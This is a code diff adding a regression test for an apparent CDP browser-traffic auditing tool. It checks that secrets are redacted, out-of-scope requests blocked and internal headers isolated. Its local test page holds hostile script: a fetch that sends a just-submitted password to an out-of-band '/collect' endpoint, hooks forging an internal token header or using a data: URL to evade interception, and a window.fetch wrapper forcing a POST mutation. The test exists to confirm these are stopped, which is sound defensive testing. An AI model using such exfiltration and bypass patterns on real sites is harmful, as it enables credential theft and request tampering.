@@ -708,4 +708,279 @@ describe("v7.0 原生 CDP 流量桥接与页面内加签契约差分", () => {
 		await Bun.sleep(80);
 		expect(findLiveProcessesByTag("nuwa-cdp-").length).toBeLessThanOrEqual(beforeCount);
 	});
+
+	test("Boost 审查回归：瞬态秘密与 extraRoleHeaders 全链路脱敏、断连快速唤醒及探针方法/协议/头部隔离", async () => {
+		const regRoot = mkdtempSync(join(tempRoot, "boost-reg-"));
+
+		// A. 验证 Playwright 目录数值序探测（chromium-1248 优先于 chromium-999）与 waitForEvent 断连毫秒级唤醒
+		const mockHome = mkdtempSync(join(tempRoot, "pw-home-"));
+		const bin999Dir = join(mockHome, ".cache", "ms-playwright", "chromium-999", "chrome-linux64");
+		const bin1248Dir = join(mockHome, ".cache", "ms-playwright", "chromium-1248", "chrome-linux64");
+		Bun.spawn(["mkdir", "-p", bin999Dir, bin1248Dir]);
+		await Bun.sleep(30);
+		const bin999 = join(bin999Dir, "chrome");
+		const bin1248 = join(bin1248Dir, "chrome");
+		writeFileSync(bin999, "#!/bin/sh\nexit 0\n", "utf8");
+		writeFileSync(bin1248, "#!/bin/sh\nexit 0\n", "utf8");
+		chmodSync(bin999, 0o755);
+		chmodSync(bin1248, 0o755);
+		expect(
+			resolveChromeExecutable({
+				homeDir: mockHome,
+				env: { HOME: mockHome, NUWA_CHROME_BIN: "", PLAYWRIGHT_BROWSERS_PATH: "" },
+			}),
+		).toBe(bin1248);
+
+		let triggerDisconnect: ((reason?: string) => void) | undefined;
+		const disconnectTransport: CdpTransportLike = {
+			send() {},
+			close() {},
+			onMessage() {},
+			onClose(cb) {
+				triggerDisconnect = cb;
+			},
+			onError() {},
+		};
+		const waiterClient = new CdpClient(disconnectTransport);
+		const waitStart = Date.now();
+		const waitTask = waiterClient.waitForEvent("Page.loadEventFired", { timeoutMs: 4_000 });
+		setTimeout(() => triggerDisconnect?.("socket_reset"), 40);
+		await expect(waitTask).rejects.toThrow(/关闭/);
+		expect(Date.now() - waitStart).toBeLessThan(600);
+
+		// B. 启动集成全套边界反例场景的本地测试服务
+		const TRANSIENT_LOGIN_PASS = "SuperSecretPwd_2026_Audit!";
+		const EXTRA_COOKIE_SEC = "extra_cookie_secret_val_991122";
+		const EXTRA_BEARER_SEC = "extra_bearer_secret_val_774455";
+		let postMutateHits = 0;
+		let leakedInternalHdr = false;
+		let leakedUrlAsHeader = false;
+
+		const regServer = Bun.serve({
+			hostname: "127.0.0.1",
+			port: 0,
+			async fetch(req: Request) {
+				const u = new URL(req.url);
+				if (req.headers.has("x-nuwa-cdp-probe-token")) {
+					leakedInternalHdr = true;
+				}
+				if (req.headers.has("url")) {
+					leakedUrlAsHeader = true;
+				}
+
+				if (u.pathname === "/api/mutate" && req.method.toUpperCase() === "POST") {
+					postMutateHits += 1;
+					return Response.json({ mutated: true }, { status: 200 });
+				}
+
+				if (u.pathname === "/login-post" && req.method.toUpperCase() === "POST") {
+					return Response.json({ ok: true, sessionReady: true });
+				}
+
+				if (u.pathname === "/guard-page") {
+					return new Response(
+						`<!doctype html><html><head><title>Guard Test</title></head><body><script>
+						(async () => {
+							await fetch("/login-post", {
+								method: "POST",
+								headers: { "content-type": "application/json" },
+								body: JSON.stringify({ user: "auditor", password: ${JSON.stringify(TRANSIENT_LOGIN_PASS)} }),
+							});
+							// 试图将刚提交的瞬态口令拼在越界 URL 查询参数中外发
+							fetch(${JSON.stringify(`${oobOrigin}/collect?d=${TRANSIENT_LOGIN_PASS}`)}).catch(() => {});
+						})();
+
+						// 钩子 1：返回混合大小写的同名内部头尝试冲突破坏令牌
+						window.__caseConflictHook = () => ({
+							"X-Nuwa-Cdp-Probe-Token": "forged_token_val",
+							"x-guard-sig": "valid_sig_1",
+						});
+
+						// 钩子 2：返回 data: 伪协议尝试绕过网络拦截
+						window.__dataProtoHook = () => ({
+							url: "data:application/json,%7B%22bypass%22%3Atrue%7D",
+						});
+
+						// 钩子 3：仅返回 { url }（无嵌套 headers），验证不会把 url 键当成 HTTP 请求头
+						window.__urlOnlyHook = () => ({
+							url: "/api/echo-auth?signed_via_query=1",
+						});
+
+						// 钩子 4：挂载篡改型 fetch 包装器（丢弃内部头并强改方法为 POST /api/mutate）
+						window.__enableMutateFetch = () => {
+							const rawFetch = window.fetch.bind(window);
+							window.fetch = () => rawFetch("/api/mutate", { method: "POST", body: "bad" });
+						};
+						</script></body></html>`,
+						{ status: 200, headers: { "content-type": "text/html; charset=utf-8" } },
+					);
+				}
+
+				if (u.pathname === "/api/echo-auth") {
+					const hasSig =
+						req.headers.get("x-guard-sig") === "valid_sig_1" ||
+						u.searchParams.get("signed_via_query") === "1";
+					if (!hasSig) {
+						return Response.json({ error: "unsigned" }, { status: 403 });
+					}
+					const auth = req.headers.get("authorization") ?? "";
+					const cookie = req.headers.get("cookie") ?? "";
+					if (!auth && !cookie) {
+						return Response.json({ error: "anon_denied" }, { status: 401 });
+					}
+					// 故意在响应体中回显收到的原始 Cookie 与 Authorization 值以检测全链路脱敏
+					return Response.json({
+						ok: true,
+						data: {
+							orderId: "9001",
+							echoCookie: cookie,
+							echoAuth: auth,
+						},
+					});
+				}
+
+				return Response.json({ error: "not_found" }, { status: 404 });
+			},
+		});
+
+		const regOrigin = `http://127.0.0.1:${regServer.port}`;
+		const scope = defaultScopeForTarget(regOrigin, "audit", {
+			allowHosts: ["127.0.0.1"],
+			denyHosts: ["evil.example.com"],
+			allowLoopback: false,
+		});
+
+		const session = await launchCdpSession();
+		const sessionTag = session.processTag;
+		const sessionProfileDir = session.userDataDir!;
+
+		try {
+			oobHitCount = 0;
+			const capRes = await captureCdpSessionTraffic(`${regOrigin}/guard-page`, regRoot, scope, {
+				session,
+				settleMs: 350,
+			});
+
+			// 1. 验证越界 0 发包且 blockedRequests / 返回结构中不残留瞬态登录口令
+			expect(oobHitCount).toBe(0);
+			expect(capRes.blockedCount).toBeGreaterThanOrEqual(1);
+			expect(JSON.stringify(capRes).includes(TRANSIENT_LOGIN_PASS)).toBe(false);
+
+			// 2. 验证大小写冲突头不会泄漏内部头到服务端，且不出现在 appliedSignatureHeaders 中
+			const caseProbe = await executeInPageSignedProbe(
+				session,
+				{
+					url: "/api/echo-auth",
+					method: "GET",
+					signerHook: "__caseConflictHook",
+					authMode: "override",
+					overrideAuthHeaders: { Authorization: "Bearer temp_check_tok_1122" },
+				},
+				scope,
+				{ root: regRoot },
+			);
+			expect(caseProbe.ok).toBe(true);
+			expect(caseProbe.status).toBe(200);
+			expect(leakedInternalHdr).toBe(false);
+			expect(
+				caseProbe.appliedSignatureHeaders.some((h) => h.toLowerCase() === "x-nuwa-cdp-probe-token"),
+			).toBe(false);
+			expect(JSON.stringify(caseProbe).includes("temp_check_tok_1122")).toBe(false);
+
+			// 3. 验证 allowCrossOriginInScope: true 下 data: 协议依然被硬阻断
+			const dataProbe = await executeInPageSignedProbe(
+				session,
+				{
+					url: "/api/echo-auth",
+					method: "GET",
+					signerHook: "__dataProtoHook",
+					allowCrossOriginInScope: true,
+				},
+				scope,
+				{ root: regRoot },
+			);
+			expect(dataProbe.ok).toBe(false);
+			expect(dataProbe.blocked).toBe(true);
+
+			// 4. 验证 { url: "/api/..." } 纯 URL 签名钩子不会把 "url" 注入为 HTTP 请求头
+			const urlOnlyProbe = await executeInPageSignedProbe(
+				session,
+				{
+					url: "/api/echo-auth",
+					method: "GET",
+					signerHook: "__urlOnlyHook",
+					authMode: "override",
+					overrideAuthHeaders: { Authorization: "Bearer url_only_tok_3344" },
+				},
+				scope,
+				{ root: regRoot },
+			);
+			expect(urlOnlyProbe.ok).toBe(true);
+			expect(urlOnlyProbe.status).toBe(200);
+			expect(leakedUrlAsHeader).toBe(false);
+			expect(urlOnlyProbe.appliedSignatureHeaders.includes("url")).toBe(false);
+
+			// 5. 验证 extraRoleHeaders（含 Cookie 键值对 + Authorization）在响应回显、磁盘日志与返回摘要中全量脱敏
+			upsertSessionRole(regRoot, {
+				role: "alice",
+				bearer: "alice_base_tok_667788",
+			});
+			const recorder = new TrafficRecorder(regRoot);
+			const extraDiff = await runCdpSignedAuthDiff(
+				`${regOrigin}/guard-page`,
+				["/api/echo-auth?id=9001"],
+				regRoot,
+				scope,
+				{
+					session,
+					recorder,
+					signerHook: "__caseConflictHook",
+					baselineRole: "alice",
+					compareRoles: ["extra_bob", "anon"],
+					extraRoleHeaders: {
+						extra_bob: {
+							Cookie: `sid=${EXTRA_COOKIE_SEC}; theme=dark`,
+							Authorization: `Bearer ${EXTRA_BEARER_SEC}`,
+						},
+					},
+				},
+			);
+			expect(extraDiff.ok).toBe(true);
+			expect(extraDiff.findings.length).toBe(1);
+			const rawLogContent = readFileSync(recorder.indexPath, "utf8");
+			const extraDiffText = JSON.stringify(extraDiff);
+			expect(rawLogContent.includes(EXTRA_COOKIE_SEC)).toBe(false);
+			expect(rawLogContent.includes(EXTRA_BEARER_SEC)).toBe(false);
+			expect(extraDiffText.includes(EXTRA_COOKIE_SEC)).toBe(false);
+			expect(extraDiffText.includes(EXTRA_BEARER_SEC)).toBe(false);
+
+			// 6. 验证页面篡改 window.fetch 丢弃内部头并改写 POST 请求时被会话级只读锁阻断（postMutateHits === 0）
+			await session.client.send(
+				"Runtime.evaluate",
+				{ expression: "window.__enableMutateFetch()" },
+				{ sessionId: session.sessionId },
+			);
+			const mutateEscapeProbe = await executeInPageSignedProbe(
+				session,
+				{
+					url: "/api/echo-auth",
+					method: "GET",
+					signerHook: "__caseConflictHook",
+					authMode: "anonymous",
+				},
+				scope,
+				{ root: regRoot },
+			);
+			expect(mutateEscapeProbe.ok).toBe(false);
+			expect(mutateEscapeProbe.blocked).toBe(true);
+			expect(postMutateHits).toBe(0);
+		} finally {
+			await closeCdpSession(session);
+			regServer.stop(true);
+		}
+
+		// 7. closeCdpSession 返回瞬间（无需额外 sleep）子进程与临时目录必须立即 0 残留
+		expect(findLiveProcessesByTag(sessionTag)).toEqual([]);
+		expect(existsSync(sessionProfileDir)).toBe(false);
+	});
 });
